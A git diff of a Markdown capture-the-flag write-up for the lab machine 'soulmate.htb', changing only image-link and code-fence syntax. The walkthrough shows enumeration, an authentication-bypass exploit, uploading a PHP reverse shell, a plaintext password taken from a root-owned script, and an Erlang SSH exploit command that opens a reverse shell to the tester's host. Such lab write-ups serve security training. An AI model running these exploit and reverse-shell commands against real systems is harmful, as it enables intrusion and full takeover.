@@ -1,5 +1,5 @@
 ### Nmap
-```bash
+```
 nmap -sV -sC -vv 10.10.11.86
 
 --OUTPUT--
@@ -23,16 +23,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 ### Port 80
 - Add to `/etc/hosts` : `soulmate.htb`
-![[Pasted image 20251203141831.png]]
+![Pasted image 20251203141831](../Attachments/Pasted%20image%2020251203141831.png)
 
 - I proceed to try and signup:
-![[Pasted image 20251203141914.png]]
+![Pasted image 20251203141914](../Attachments/Pasted%20image%2020251203141914.png)
 
 - Create user `test:testtest`
-![[Pasted image 20251203141957.png]]
+![Pasted image 20251203141957](../Attachments/Pasted%20image%2020251203141957.png)
 
 - I logni as user:
-![[Pasted image 20251203142024.png]]
+![Pasted image 20251203142024](../Attachments/Pasted%20image%2020251203142024.png)
 
 - I see it redirects me to `profile.php` 
 - I am thinking the image upload could be injectable
@@ -40,7 +40,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 - Going back I find aonther site enumerating port 80
-```bash
+```
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://soulmate.htb/ -H 'Host: FUZZ.soulmate.htb' -fs 154
 
 ---OUTPUT---
@@ -72,51 +72,51 @@ ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51m
 
 ```
 
-![[Pasted image 20251203153932.png]]
+![Pasted image 20251203153932](../Attachments/Pasted%20image%2020251203153932.png)
 
 - Checking `ftp.soulmate.htb` after adding to `/etc/hosts`
-![[Pasted image 20251203154736.png]]
+![Pasted image 20251203154736](../Attachments/Pasted%20image%2020251203154736.png)
 
 - Looking online and on searchsploit I see an exploir:
-![[Pasted image 20251203180216.png]]
+![Pasted image 20251203180216](../Attachments/Pasted%20image%2020251203180216.png)
 - I try the authentication bypass exploit:
 ```
 python3 52295.py --target ftp.soulmate.htb --port 80 --new-user admin --password admin1234 --exploit
 ```
 - I then login with those credentials to get admin access
-![[Pasted image 20251203181848.png]]
+![Pasted image 20251203181848](../Attachments/Pasted%20image%2020251203181848.png)
 - Looking around I find some other users with their shared folders
 	- Admin > User Manager > ben > webProd directory
-![[Pasted image 20251203182115.png]]
+![Pasted image 20251203182115](../Attachments/Pasted%20image%2020251203182115.png)
 - I find a user ben with the folder for the website `soulmate.htb` and change his password to `testtest`
 - I then login to the platform with `ben`'s credentials
 - I select webProd and click Add Files to add my php reverse shell:
-![[Pasted image 20251203182257.png]]
+![Pasted image 20251203182257](../Attachments/Pasted%20image%2020251203182257.png)
 
 - On accessing `http://soulmate.htb/php-reverse-shell.php` on the browser I catch a shell on my listener (and make a better shell):
-![[Pasted image 20251203182513.png]]
+![Pasted image 20251203182513](../Attachments/Pasted%20image%2020251203182513.png)
 
 - I find theres a user ben and im user `www-data`. Looking at ps -aux or linpeas I see this output:
-![[Pasted image 20251203182718.png]]
+![Pasted image 20251203182718](../Attachments/Pasted%20image%2020251203182718.png)
 ```
 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
 ```
 - this was a process run by root.
 - On reading the start.escript file I find a password for ben:
-![[Pasted image 20251203182842.png]]
+![Pasted image 20251203182842](../Attachments/Pasted%20image%2020251203182842.png)
 
 - I can switch to user ben with these credentials `ben:HouseH0ldings998`
 - Looking further we see it is some ssh service running on port 2222 and furthermore this file is owned by root.
 - I grab user flag as user ben:
-![[Pasted image 20251203183118.png]]
+![Pasted image 20251203183118](../Attachments/Pasted%20image%2020251203183118.png)
 
 - I check open ports 
-```bash
+```
 ss -tlnp
 ```
-![[Pasted image 20251203183201.png]]
+![Pasted image 20251203183201](../Attachments/Pasted%20image%2020251203183201.png)
 - I see port 2222 is running locally. I try to catch it with nc command and get an output:
-![[Pasted image 20251203183241.png]]
+![Pasted image 20251203183241](../Attachments/Pasted%20image%2020251203183241.png)
 
 - Looking online I find an exploit for Erlang SSH:
 	- https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
@@ -124,9 +124,9 @@ ss -tlnp
 ```
 python3 exploit.py 127.0.0.1 -p 2222 --shell --lhost 10.10.14.47 --lport 9999
 ```
-![[Pasted image 20251203183811.png]]
+![Pasted image 20251203183811](../Attachments/Pasted%20image%2020251203183811.png)
 - I get a slightly better shell and grab the root flag:
 ```
 script /dev/null -c bash
 ```
-![[Pasted image 20251203183921.png]]
+![Pasted image 20251203183921](../Attachments/Pasted%20image%2020251203183921.png)
